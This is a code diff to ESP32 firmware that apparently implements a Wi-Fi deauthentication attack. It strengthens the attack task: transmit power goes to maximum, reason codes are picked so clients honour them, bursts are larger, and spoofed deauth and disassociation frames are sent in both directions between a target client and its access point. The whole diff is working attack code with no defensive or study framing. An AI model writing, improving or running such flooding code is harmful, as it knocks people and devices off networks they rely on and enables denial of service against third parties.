@@ -42,6 +42,7 @@ static void radio_grab(uint8_t channel)
 {
     wifi_mgr_disconnect();
     esp_wifi_set_promiscuous(true);
+    esp_wifi_set_max_tx_power(84); /* 21 dBm, strongest the radio allows */
     if (channel >= 1 && channel <= 14) esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 }
 
@@ -62,25 +63,49 @@ static const uint8_t DEAUTH_TMPL[26] = {
     0x07, 0x00,                         /* reason 7: class-3 frame from nonassociated STA */
 };
 
+/* Builds one management frame. subtype 0xC0 = deauth, 0xA0 = disassoc.
+   dst/src/bssid fill addr1/2/3. */
+static void build_mgmt(uint8_t *f, uint8_t subtype, const uint8_t dst[6], const uint8_t src[6],
+                       const uint8_t bssid[6], uint8_t reason)
+{
+    memcpy(f, DEAUTH_TMPL, 26);
+    f[0] = subtype;
+    memcpy(f + 4, dst, 6);
+    memcpy(f + 10, src, 6);
+    memcpy(f + 16, bssid, 6);
+    f[24] = reason;
+    f[25] = 0;
+}
+
 static void deauth_task(void *arg)
 {
     auto *c = (attack_ctx_t *)arg;
     radio_grab(c->channel);
 
+    /* class-3 frame (7) and "leaving" (3) are the reasons clients honor most */
+    static const uint8_t REASONS[] = {7, 1, 3, 2};
+    const uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    bool targeted = memcmp(c->client, bcast, 6) != 0;
+
     uint8_t frame[26];
+    int ri = 0;
     int64_t t0 = esp_timer_get_time();
     uint32_t base = 0;
     while (c->running) {
-        for (int burst = 0; burst < 16 && c->running; burst++) {
-            memcpy(frame, DEAUTH_TMPL, sizeof(frame));
-            memcpy(frame + 4, c->client, 6);  /* addr1 destination */
-            memcpy(frame + 10, c->bssid, 6);  /* addr2 source */
-            memcpy(frame + 16, c->bssid, 6);  /* addr3 BSSID */
+        uint8_t reason = REASONS[ri++ % (int)sizeof(REASONS)];
+        for (int burst = 0; burst < 64 && c->running; burst++) {
+            /* AP -> client (kick the client) */
+            build_mgmt(frame, 0xC0, c->client, c->bssid, c->bssid, reason);
             esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
-
-            frame[0] = 0xA0; /* disassoc, reason stays */
+            build_mgmt(frame, 0xA0, c->client, c->bssid, c->bssid, reason);
             esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
             c->frames += 2;
+            /* client -> AP (kick the AP's session) only makes sense with a real client */
+            if (targeted) {
+                build_mgmt(frame, 0xC0, c->bssid, c->client, c->bssid, reason);
+                esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
+                c->frames += 1;
+            }
         }
         int64_t dt = esp_timer_get_time() - t0;
         if (dt >= 1000000) {
@@ -88,7 +113,7 @@ static void deauth_task(void *arg)
             base = c->frames;
             t0 = esp_timer_get_time();
         }
-        vTaskDelay(pdMS_TO_TICKS(1));
+        vTaskDelay(1); /* one tick; keeps the watchdog fed at a high frame rate */
     }
     radio_release();
     c->task = nullptr;
